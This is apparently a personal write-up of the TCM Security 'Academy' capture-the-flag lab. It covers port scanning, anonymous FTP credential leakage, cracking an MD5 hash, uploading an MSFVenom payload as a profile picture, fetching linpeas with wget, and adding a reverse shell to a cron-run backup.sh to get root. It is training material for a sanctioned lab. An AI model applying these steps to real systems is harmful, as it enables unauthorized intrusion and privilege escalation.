# TCM - Academy

June 3, 2023 

---

## Introduction

This machine is created by TCM Security (of which I am currently taking the PEH course), it is supposed to be an easy CTF challenge.
The object is to acquire root access and receive the flag via any means possible (Ethically).

---

## Information Gathering

***Port Scanning***

- Beginning the reconnaissance by running `nmap -T4 -p- -A {IP}`
    
    ```bash
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 19:02 EDT
    Nmap scan report for academy (192.168.1.169)
    Host is up (0.00084s latency).
    Not shown: 65532 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:192.168.1.151
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
    |   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
    |_  256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    |_http-server-header: Apache/2.4.38 (Debian)
    MAC Address: 00:0C:29:1C:54:B8 (VMware)
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.6
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.83 ms academy (192.168.1.169)
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
    ```
    
- Port 21, 22, and 80 are open

***Port 21***

- FTP - Anonymous login allowed
- Besides the anonymous login, there wasn't anything else I could find a vulnerability for. I checked to see if there was anything for `vsftpd 3.0.3`, for which I found this [Remote Denial of Service](https://www.exploit-db.com/exploits/49719), but that wouldn't really be helpful for rooting the machine.

***Port 22***

- For this port, I researched exploits for this specific version `OpenSSH 7.9p1`, for which only one website came up ([Rapid7](https://www.rapid7.com/db/modules/exploit/multi/ssh/sshexec/)) and I tried the steps shown but it didn't work.

***Port 80***

- This was a Debian website, just saying that the apache server was working. After further research using `dirbuster`, I found an admin login, student login and PHP server login. (*This was useful for what will be mentioned below*).

---

## Exploitation and Root access

***Port 21***

- First thing, I connected to FTP as anonymous since it was allowed. After the connection, there was a `.txt` file in there with some leaked information about student login (username and password).
- The password was in the form of a hash, but after running `hash-identifier` it came up to be an MD5 encryption. The cracking was fairly easy and quick with `hashcat`
- From here on, I went to the website and there was an option to upload a picture for the student. Knowing this, I set up a listener with `Metasploit` and created a `MSFVenom` (payload generator). As soon as I uploaded the payload, I got a session.
    - <img width="920" alt="Screenshot_2023-06-02_at_9 06 01_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/48a9b5d0-15e9-47d0-8b29-1742eda9b3af">
    
- After gaining this, I did not have root access immediately (actually took me a while to figure out what to do from here), but after some research, I figured out that I needed some privilege escalation for which I found this https://github.com/carlospolop/PEASS-ng which gave information on how to gain that escalation. I ran this, after opening my port 80 and running `wget HTTP://{IP}/linpeas`, changing the mode to executable and running it
    - <img width="781" alt="Screenshot_2023-06-02_at_9 06 14_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/21ee70fc-50af-4e22-b191-365e4a4ac372">
    
- After running that script, there was some vulnerability that I discovered, which was a user (admin) and password.
    - <img width="541" alt="Screenshot_2023-06-02_at_9 21 15_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/d94f0bdd-780c-4b1d-9ecb-8bda4e0aa4a8">
    - <img width="1008" alt="Screenshot_2023-06-02_at_9 26 13_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/29139e3a-ce21-4ec3-80b8-8db1aa7e65f2">
    - <img width="501" alt="Screenshot_2023-06-02_at_9 27 17_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/88658993-5011-4f50-afce-015f4681a11a">
    
- I connect to it through ssh. I did not have `sudo` access so I needed some privilege escalation for this as well.
- After seeing that there was a .sh file (inside had time instructions), I tried to see the `cron jobs` to see if it was scheduled, but I had no permission to run `crontab -l`, so I followed the same procedure like the one above (with the open port 80) and installed https://github.com/DominicBreuker/pspy which can be run even when you don't have access to `crontab -l`
- After this, it was clear that the `backup.sh` was getting updated, and I used `vim` to add bash reverse shell code from [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - <img width="662" alt="Screenshot_2023-06-02_at_9 30 14_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/ad099a40-7f19-4f92-8c33-629d33436dcb">

- After doing that, the `backup.sh` got updated and I got root access
    - <img width="336" alt="Screenshot_2023-06-02_at_9 44 39_PM" src="https://github.com/ErlisI/ctf-writeups/assets/63165733/8aef1c8c-7ce8-459f-b1f4-2708224c0c25">

P.S: Even though this machine was labeled as easy, it didn't actually feel easy and I can say it took a little too long to get here, and A LOT OF RESEARCH LOL!

***Also chek it out [here](https://e-ctf-writeups.notion.site/HackTheBox-Academy-4567e157d2934ce384586ef839c814d3?pvs=4)***
